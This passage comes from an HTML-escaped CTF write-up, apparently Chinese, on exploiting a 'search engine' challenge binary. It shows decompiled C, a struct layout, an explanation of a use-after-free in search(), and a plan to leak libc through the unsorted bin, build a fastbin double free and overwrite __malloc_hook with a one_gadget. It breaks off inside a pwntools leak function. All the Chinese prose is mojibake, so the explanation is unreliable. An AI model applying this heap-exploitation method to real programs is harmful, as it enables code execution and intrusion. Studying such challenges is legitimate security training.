      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_8:&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Added sentence&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ç»è¿‡åˆ†æï¼Œwordç»“æ„ä½“çš„å†…å­˜åˆ†å¸ƒåº”è¯¥æ˜¯ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-plain&quot;&gt;00000000 Word            struc ; (sizeof=0x28, mappedto_6)
00000000 word_ptr        dq ?                    
00000008 word_size       dd ?                    
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?
00000018 sentence_size   dd ?
0000001C padding2        dd ?
00000020 prev            dq ?
00000028 Word            ends
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ç”¨ä»£ç è¿˜åŸä¸€ä¸‹å°±æ˜¯ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;search()&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;â€ƒâ€ƒè¿™ä¸ªå‡½æ•°çš„å¤§æ¦‚ç®—æ³•å°±æ˜¯ä»word_headå¼€å§‹ä¾¿åˆ©wordé“¾è¡¨ï¼Œç„¶åæŸ¥æ‰¾å¯¹åº”çš„å•è¯ã€‚å…¶ä¸»è¦çš„åˆ¤æ–­é€»è¾‘åœ¨&lt;code class=&quot;highlighter-rouge&quot;&gt;v2-&amp;gt;word_size == size &amp;amp;&amp;amp; !memcmp(v2-&amp;gt;word_ptr,v1,size)&lt;/code&gt;è¿™é‡Œï¼Œå°±æ˜¯è¯´å•è¯çš„sizeè¦å’Œç»“æ„ä½“ä¸­çš„sizeç›¸ç­‰ï¼Œç„¶åå•è¯çš„å†…å®¹ä¹Ÿè¦ç›¸ç­‰ã€‚&lt;br /&gt;
â€ƒâ€ƒæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“æŸ¥æ‰¾åˆ°å¯¹åº”çš„å¥å­æ—¶ï¼Œä¼šæ‰“å°å‡ºå¯¹åº”çš„å¥å­ï¼Œç„¶åé—®ä½ æ˜¯ä¸æ˜¯è¦freeæ‰sentenceã€‚å¦‚æœä½ freeäº†ï¼Œè¿™ä¸ªsentenceçš„å†…å®¹ä¼šè¢«è®¾ç½®æˆ&lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt;ã€‚ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œsentenceè¢«freeåï¼Œ&lt;strong&gt;sentence_ptræ²¡æœ‰è¢«è®¾æˆnull&lt;/strong&gt;ï¼Œå› æ­¤è¿™é‡Œå¯ä»¥ä½¿ç”¨uafæ¼æ´æ³„æ¼unsorted-binçš„åœ°å€ã€‚å¦å¤–è¯¥wordä¹Ÿæ²¡æœ‰ä»é“¾è¡¨ä¸­ç§»é™¤ï¼Œæ‰€ä»¥æ¯æ¬¡æœç´¢è¿˜æ˜¯è¦ä¾¿åˆ©åˆ°ã€‚è¿™æ—¶æˆ‘ä»¬å¯ä»¥è¾“å…¥&lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt;æ¥ç»•è¿‡&lt;code class=&quot;highlighter-rouge&quot;&gt;memcmp()&lt;/code&gt;çš„æ£€æµ‹ï¼Œé‚£æ€ä¹ˆç»•è¿‡å‰é¢çš„sizeæ¯”è¾ƒå‘¢ï¼Ÿ&lt;br /&gt;
â€ƒâ€ƒå‡å¦‚æˆ‘ä»¬æ„é€ â€™aaa bâ€™è¿™ç§å¥å­ï¼Œé‚£ä¹ˆ â€˜bâ€™ è¿™ä¸ªå•è¯sizeå°±æ˜¯1ï¼Œç„¶åfreeä¹‹åbè¢«è®¾ç½®æˆäº†&lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt;ï¼Œäºæ˜¯ä¾¿å¯ä»¥ç»•è¿‡æ•´ä¸ªåˆ¤æ–­ã€‚&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;......&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the word size:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_number&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;throw_err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the word:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;read_by_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word_head&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_BYTE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;__printf_chk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Found %d: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;fwrite&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1uLL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;putchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;n&quot;&gt;read_by_byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'y'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sentence_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Deleted!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
          &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Word&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;äºæ˜¯æˆ‘ä»¬çš„å¤§æ¦‚æ€è·¯å°±æ˜¯ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;åˆ©ç”¨uafï¼Œä½¿ç”¨unsorted-binæ³„æ¼libcçš„åœ°å€&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨double freeæ„é€ fastbinå¾ªç¯é“¾è¡¨ï¼Œoverwriteå…¶fdæŒ‡é’ˆä¸ºfake_chunk&lt;/li&gt;
  &lt;li&gt;åœ¨fake_chunkä¸­è¦†ç›–__malloc_hookä¸ºone_gadget&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;çœ‹èµ·æ¥å¾ˆç®€å•â€¦å…¶å®ä¸€è¨€éš¾è¿›ã€‚&lt;/p&gt;

&lt;h4 id=&quot;leak-libc&quot;&gt;leak libc&lt;/h4&gt;
&lt;hr /&gt;
&lt;p&gt;â€ƒâ€ƒé¦–å…ˆæˆ‘ä»¬è¦åšçš„å°±æ˜¯æƒ³åŠæ³•æ³„æ¼å‡ºlibcçš„åœ°å€ï¼Œæœ¬é¢˜é‡‡ç”¨çš„æ³„æ¼unsorted-binçš„åœ°å€çš„æ–¹å¼æˆ‘ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è§åˆ°ï¼Œæœ‰&lt;strong&gt;äº¿äº›&lt;/strong&gt;ç»†èŠ‚å¾ˆè®²ç©¶ï¼Œå¤§è‡´æµç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;é¦–å…ˆåˆ†é…ä¸€ä¸ªsmall-binï¼Œç„¶åfreeæ‰ï¼Œå®ƒè¿›å…¥unsorted-bin&lt;/li&gt;
  &lt;li&gt;æ­¤æ—¶ä»–æ„æˆä¸€ä¸ªåŒå‘é“¾è¡¨ï¼Œæˆ‘ä»¬é€šè¿‡puts_sentenceæ¥æ‰“å°å…¶fdæŒ‡é’ˆï¼Œè¿™é‡Œçš„fdæŒ‡é’ˆå°±æ˜¯unsorted-bin-addr&lt;/li&gt;
  &lt;li&gt;æ ¹æ®unsorted-bin-addræ¥è®¡ç®—main_arenaçš„åœ°å€ï¼Œè¿™é‡Œè¦å¯¹ç€æºç è¿›è¡Œè®¡ç®—â€¦ååˆ†ç¹ç&lt;/li&gt;
  &lt;li&gt;å»libc.soä¸­æŸ¥æ‰¾main_arenaçš„åç§»åœ°å€main_arena_libc&lt;/li&gt;
  &lt;li&gt;libcçš„åç§»offset = main_arena - main_arena_libc&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å¥½çš„è¿™ä¸ªæ³„æ¼unsorted-binçš„å‡½æ•°æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;leak_bins&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;contain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x85&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'b'&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;add_sentence&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;contain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'b'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Delete this sentence (y/n)?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'y'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
